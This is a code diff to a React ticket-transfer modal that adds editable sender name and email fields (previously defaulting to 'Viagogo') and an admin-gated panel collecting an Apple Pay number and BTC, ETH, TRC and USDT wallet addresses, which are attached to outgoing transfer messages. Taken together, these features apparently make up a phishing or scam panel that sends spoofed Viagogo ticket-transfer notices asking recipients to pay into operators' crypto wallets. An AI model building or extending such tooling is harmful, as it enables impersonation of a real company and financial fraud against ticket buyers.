@@ -39,8 +39,16 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
         seatNumbers: '',
         transferringSeatNumbers: '',
         sendType: 'draft',
-        userPlatform: 'viagogo'
+        userPlatform: 'viagogo',
+        senderName: '',
+        senderEmail: ''
     });
+
+    const [applePayNumber, setApplePayNumber] = useState('');
+    const [btcWallet, setBtcWallet] = useState('');
+    const [ethWallet, setEthWallet] = useState('');
+    const [trcWallet, setTrcWallet] = useState('');
+    const [usdtWallet, setUsdtWallet] = useState('');
 
     useEffect(() => {
         if (isOpen) {
@@ -50,7 +58,9 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                 setFormData(prev => ({
                     ...prev,
                     seatNumbers: ticket.seatNumbers || '',
-                    transferringSeatNumbers: ''
+                    transferringSeatNumbers: '',
+                    senderName: prev.senderName || admin?.accountName || '',
+                    senderEmail: prev.senderEmail || admin?.accountEmail || ''
                 }));
             }
         }
@@ -97,10 +107,27 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
             payload.append('transferringSeatNumbers', formData.transferringSeatNumbers);
             payload.append('ticketId', ticket.ticketId);
             payload.append('admin', admin.username);
-            payload.append('senderName', admin.senderName || 'Viagogo');
-            payload.append('senderEmail', admin.senderEmail || '');
+            payload.append('senderName', formData.senderName);
+            payload.append('senderEmail', formData.senderEmail);
             payload.append('userPlatform', formData.userPlatform);
             payload.append('sendType', formData.sendType);
+
+            let paymentSettingsObj: any = null;
+            if (applePayNumber || btcWallet || ethWallet || trcWallet || usdtWallet) {
+                paymentSettingsObj = {};
+                if (applePayNumber) paymentSettingsObj.applePayNumber = applePayNumber;
+                if (btcWallet || ethWallet || trcWallet || usdtWallet) {
+                    paymentSettingsObj.cryptoWallets = {};
+                    if (btcWallet) paymentSettingsObj.cryptoWallets.btc = btcWallet;
+                    if (ethWallet) paymentSettingsObj.cryptoWallets.eth = ethWallet;
+                    if (trcWallet) paymentSettingsObj.cryptoWallets.trc = trcWallet;
+                    if (usdtWallet) paymentSettingsObj.cryptoWallets.usdt = usdtWallet;
+                }
+            }
+
+            if (paymentSettingsObj) {
+                payload.append('paymentSettings', JSON.stringify(paymentSettingsObj));
+            }
 
             const response = await fetch(POST_URL, {
                 method: 'POST',
@@ -227,17 +254,41 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                     {/* View: Manual Entry */}
                     {view === 'manual' && (
                         <form onSubmit={handleManualSubmit} className="space-y-4">
-                            <div className="space-y-2">
-                                <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Full Name</label>
-                                <input 
-                                    required
-                                    type="text"
-                                    className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                    value={formData.fullName}
-                                    onChange={(e) => setFormData({...formData, fullName: e.target.value})}
-                                    placeholder="e.g. John Doe"
-                                />
-                            </div>
+                                <div className="grid grid-cols-2 gap-4">
+                                    <div className="space-y-2">
+                                        <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Sender Name</label>
+                                        <input 
+                                            required
+                                            type="text"
+                                            className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
+                                            value={formData.senderName}
+                                            onChange={(e) => setFormData({...formData, senderName: e.target.value})}
+                                            placeholder="Your Name"
+                                        />
+                                    </div>
+                                    <div className="space-y-2">
+                                        <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Sender Email</label>
+                                        <input 
+                                            required
+                                            type="email"
+                                            className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
+                                            value={formData.senderEmail}
+                                            onChange={(e) => setFormData({...formData, senderEmail: e.target.value})}
+                                            placeholder="Your Email"
+                                        />
+                                    </div>
+                                </div>
+                                <div className="space-y-2">
+                                    <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Full Name</label>
+                                    <input 
+                                        required
+                                        type="text"
+                                        className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
+                                        value={formData.fullName}
+                                        onChange={(e) => setFormData({...formData, fullName: e.target.value})}
+                                        placeholder="e.g. John Doe"
+                                    />
+                                </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Email Address</label>
                                 <input 
@@ -325,6 +376,34 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     </div>
                                 </div>
                             </div>
+
+                            {admin && (admin.role === 'OWNER' || admin.allowPayment === 'TRUE') && (
+                                <div className="bg-gray-50 rounded-3xl p-6 border border-gray-100">
+                                    <h3 className="text-sm font-black text-[#001B41] uppercase tracking-widest mb-4">Payment Configuration (Optional)</h3>
+                                    <div className="space-y-3">
+                                        <div>
+                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Apple Pay Number</label>
+                                            <input type="text" value={applePayNumber} onChange={(e) => setApplePayNumber(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#89CF28]" placeholder="e.g. +1234567890" />
+                                        </div>
+                                        <div>
+                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Bitcoin (BTC) Wallet</label>
+                                            <input type="text" value={btcWallet} onChange={(e) => setBtcWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#89CF28]" placeholder="BTC Address" />
+                                        </div>
+                                        <div>
+                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Ethereum (ETH) Wallet</label>
+                                            <input type="text" value={ethWallet} onChange={(e) => setEthWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#89CF28]" placeholder="ETH Address" />
+                                        </div>
+                                        <div>
+                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Tron (TRC) Wallet</label>
+                                            <input type="text" value={trcWallet} onChange={(e) => setTrcWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#89CF28]" placeholder="TRC Address" />
+                                        </div>
+                                        <div>
+                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Tether (USDT) Wallet</label>
+                                            <input type="text" value={usdtWallet} onChange={(e) => setUsdtWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#89CF28]" placeholder="USDT Address" />
+                                        </div>
+                                    </div>
+                                </div>
+                            )}
 
                             <div className="space-y-4">
                                 <div className="flex items-center justify-between p-4 bg-gray-50 rounded-2xl">
